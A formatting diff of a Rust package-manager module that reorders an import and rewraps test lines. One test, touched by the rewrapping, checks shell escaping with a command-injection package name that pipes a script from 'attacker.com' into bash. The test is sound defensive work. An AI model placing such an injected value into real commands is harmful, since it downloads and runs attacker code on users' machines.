@@ -25,10 +25,10 @@
 //! println!("Cache entries: {}", stats.entries);
 //! ```
 
+use crate::configuration::SantaConfig;
 use crate::errors::{Result, SantaError};
 use crate::script_generator::{ExecutionMode, ScriptFormat, ScriptGenerator};
 use crate::traits::{Cacheable, PackageManager};
-use crate::configuration::SantaConfig;
 use std::borrow::Cow;
 use std::time::Duration;
 
@@ -1201,7 +1201,8 @@ mod tests {
                 );
 
                 let adjusted = source_with_prepend.adjust_package_name("git");
-                let install_cmd = source_with_prepend.install_packages_command(vec!["git".to_string()]);
+                let install_cmd =
+                    source_with_prepend.install_packages_command(vec!["git".to_string()]);
 
                 assert!(
                     adjusted.contains('\''),
@@ -1321,7 +1322,8 @@ mod tests {
                         adjusted
                     );
                 } else {
-                    let install_cmd = source.install_packages_command(vec![unicode_pkg.to_string()]);
+                    let install_cmd =
+                        source.install_packages_command(vec![unicode_pkg.to_string()]);
                     assert!(
                         install_cmd.contains("brew install"),
                         "Normal Unicode should not break commands: {}",
@@ -1469,9 +1471,8 @@ mod tests {
             let install_cmd = source.install_packages_command(attack_packages);
 
             assert!(install_cmd.contains("cargo install"));
-            assert!(
-                install_cmd.contains("'; curl -s attacker.com/payload.sh | bash; echo fake-package'")
-            );
+            assert!(install_cmd
+                .contains("'; curl -s attacker.com/payload.sh | bash; echo fake-package'"));
         }
 
         #[test]
